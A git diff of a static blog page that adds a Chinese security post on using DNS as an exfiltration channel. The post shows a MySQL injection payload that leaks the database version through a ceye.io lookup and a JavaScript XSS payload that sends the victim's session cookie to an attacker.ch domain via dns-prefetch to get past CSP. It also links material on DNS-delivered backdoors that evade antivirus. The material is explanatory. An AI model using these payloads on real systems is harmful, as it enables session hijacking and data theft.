@@ -7,7 +7,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>你好哇吴文娟 | Homaebic-Know thyself</title>
+  <title>Homaebic-Know thyself</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -15,14 +15,19 @@
     <meta name="keywords" content="forsigner,前端,设计,Hexo主题,前端开发,用户体验,设计,frontend,design,nodejs,JavaScript" />
   
 
-  <meta property="og:type" content="article">
-<meta property="og:title" content="你好哇吴文娟">
-<meta property="og:url" content="http://hebic.me/2017/08/19/你好哇吴文娟/index.html">
+  <meta name="description" content="一说起DNS，就会想到域名系统和他会把IP和域名相互转换的功能。但是最近我发现DNS不仅仅可以做到上面的功能，在安全中，DNS有着一些“另类”的功能。归根结底，利用的是DNS可以传输数据的属性。当传统信道无法将内部的传输出来时，DNS通道就成为一个很好的选择。 SQL中的DNS在SQL注入中，DNS通道就可以用来传输数据。将需要的数据和一个域名绑定，让MySQL带着数据解析此域名，DNS服务器就会">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Homaebic-Know thyself">
+<meta property="og:url" content="http://hebic.me/2017/08/19/利用DNS通道传输一点数据/index.html">
 <meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="一说起DNS，就会想到域名系统和他会把IP和域名相互转换的功能。但是最近我发现DNS不仅仅可以做到上面的功能，在安全中，DNS有着一些“另类”的功能。归根结底，利用的是DNS可以传输数据的属性。当传统信道无法将内部的传输出来时，DNS通道就成为一个很好的选择。 SQL中的DNS在SQL注入中，DNS通道就可以用来传输数据。将需要的数据和一个域名绑定，让MySQL带着数据解析此域名，DNS服务器就会">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2017-08-19T09:15:05.735Z">
+<meta property="og:image" content="http://hebic.me/usr/uploads/2017/06/3169708276.jpg">
+<meta property="og:updated_time" content="2017-08-19T14:55:34.743Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="你好哇吴文娟">
+<meta name="twitter:title" content="Homaebic-Know thyself">
+<meta name="twitter:description" content="一说起DNS，就会想到域名系统和他会把IP和域名相互转换的功能。但是最近我发现DNS不仅仅可以做到上面的功能，在安全中，DNS有着一些“另类”的功能。归根结底，利用的是DNS可以传输数据的属性。当传统信道无法将内部的传输出来时，DNS通道就成为一个很好的选择。 SQL中的DNS在SQL注入中，DNS通道就可以用来传输数据。将需要的数据和一个域名绑定，让MySQL带着数据解析此域名，DNS服务器就会">
+<meta name="twitter:image" content="http://hebic.me/usr/uploads/2017/06/3169708276.jpg">
 
   
 
@@ -179,12 +184,17 @@
 </div>
 
 
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL中的DNS"><span class="toc-text">SQL中的DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS中的DNS"><span class="toc-text">XSS中的DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#渗透测试中的DNS"><span class="toc-text">渗透测试中的DNS</span></a></li></ol>
+  </div>
+
 
 
 <div class="content content-post CENTER">
-   <article id="post-你好哇吴文娟" class="article article-type-post" itemprop="blogPost">
+   <article id="post-利用DNS通道传输一点数据" class="article article-type-post" itemprop="blogPost">
   <header class="article-header">
-    <h1 class="post-title">你好哇吴文娟</h1>
+    <h1 class="post-title">(no title)</h1>
 
     <div class="article-meta">
       <span>
@@ -200,7 +210,7 @@
       
         <span>
           <i class="icon-comment"></i>
-          <a href="http://hebic.me/2017/08/19/你好哇吴文娟/#disqus_thread"></a>
+          <a href="http://hebic.me/2017/08/19/利用DNS通道传输一点数据/#disqus_thread"></a>
         </span>
       
 
@@ -219,7 +229,23 @@
 
   <div class="article-content">
     
-      
+      <p>一说起DNS，就会想到域名系统和他会把IP和域名相互转换的功能。但是最近我发现DNS不仅仅可以做到上面的功能，在安全中，DNS有着一些“另类”的功能。归根结底，利用的是DNS可以传输数据的属性。当传统信道无法将内部的传输出来时，DNS通道就成为一个很好的选择。</p>
+<h3 id="SQL中的DNS"><a href="#SQL中的DNS" class="headerlink" title="SQL中的DNS"></a>SQL中的DNS</h3><p>在SQL注入中，DNS通道就可以用来传输数据。将需要的数据和一个域名绑定，让MySQL带着数据解析此域名，DNS服务器就会记录下这个数据。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(\<span class="string">'\\\\\\\\\',version(),\'.ikyzvu.ceye.io\'));</span></div></pre></td></tr></table></figure></p>
+<p>查询DNS记录就可以看到需要的数据。不过使用DNS信道带出数据在SQL注入中比较少，毕竟load_file不可以随便就使用的。</p>
+<p><img src="http://hebic.me/usr/uploads/2017/06/3169708276.jpg" alt="QQ截图20170609091548.jpg"></p>
+<h3 id="XSS中的DNS"><a href="#XSS中的DNS" class="headerlink" title="XSS中的DNS"></a>XSS中的DNS</h3><p>在XSS的防御机制中有一个叫做CSP的东西，这个东西是一个维护人员可以自定义的白名单，以限制脚本和各种外部资源的加载。</p>
+<p>一个网站的CSP设置非常的凶悍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Security-Policy: default-src \&apos;none\&apos;; script-src \&apos;self\&apos;</div></pre></td></tr></table></figure></p>
+<p>看起来他只允许内部的脚本执行。<b>但是CSP的开发初衷是预防XSS漏洞，而没有考虑到信息泄露的问题。</b>因此使用DNS通道将获得的信息传递出来就显得很bug，DNS预读取可以做到这个。将需要的信息与域名结合起来使用DNS通道传输出来。需要注意的是火狐浏览器的X-DNS-Prefetch-Control头可以阻止DNS预读取传递信息。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> sessionid = <span class="built_in">document</span>.cookie.split(\<span class="string">'=\')[1]+".";</span></div><div class="line"><span class="string">var body = document.getElementsByTagName(\'body\')[0];</span></div><div class="line"><span class="string">// injecting the link tag in the HTML body force the browser</span></div><div class="line"><span class="string">// to prefetch the given domain</span></div><div class="line"><span class="string">body.innerHTML = body.innerHTML + "&lt;link rel=\\"dns-prefetch\\"</span></div><div class="line"><span class="string">  href=\\"//" + sessionid + "attacker.ch\\"&gt;";</span></div></pre></td></tr></table></figure>
+<h3 id="渗透测试中的DNS"><a href="#渗透测试中的DNS" class="headerlink" title="渗透测试中的DNS"></a>渗透测试中的DNS</h3><p>我的渗透水平非常差，又看到连着好几篇文章写道使用DNS通道传输meterpreter payload绕过杀软。没有去复现，就把原文贴过来。</p>
+<ol>
+<li><a href="http://bobao.360.cn/learning/detail/3466.html" target="_blank" rel="external">通过DNS传输后门来绕过杀软</a></li>
+<li><a href="http://bobao.360.cn/learning/detail/3550.html" target="_blank" rel="external">利用DNS AAAA记录和IPv6地址传输后门</a></li>
+<li><a href="http://bobao.360.cn/learning/detail/3607.html" target="_blank" rel="external">针对利用DNS的TXT记录查询进行通信绕过杀软检测的木马分析</a></li>
+</ol>
+<p>如果你愿意，甚至可以使用DNS传输文件：<a href="https://github.com/breenmachine/dnsftp" target="_blank" rel="external">Use only DNS queries to download a file, and then execute it.</a></p>
+<p>对于需要将数据传输出来的地方不止于此，尤其是在读文件时，文件内容没有显示出来时，DNS通道也许是个选择。具体的利用方法还需要慢慢的挖掘。</p>
+
     
   </div>
 </article>
@@ -249,10 +275,10 @@
 
    
   <div class="box-prev-next clearfix">
-    <a class="hide pull-left" href="/">
+    <a class="show pull-left" href="/2017/08/19/关于一个sql注入题目思考的思考/">
         <i class="icon icon-angle-left"></i>
     </a>
-    <a class="show pull-right" href="/2017/08/19/74CMS_3.5 二次注入/">
+    <a class="show pull-right" href="/2017/08/19/审计入门之路（二）：ourphp/">
         <i class="icon icon-angle-right"></i>
     </a>
   </div>
@@ -377,7 +403,7 @@
   <script>
     var disqus_shortname = 'forsigner';
     
-    var disqus_url = 'http://hebic.me/2017/08/19/你好哇吴文娟/';
+    var disqus_url = 'http://hebic.me/2017/08/19/利用DNS通道传输一点数据/';
     
     (function(){
       var dsq = document.createElement('script');
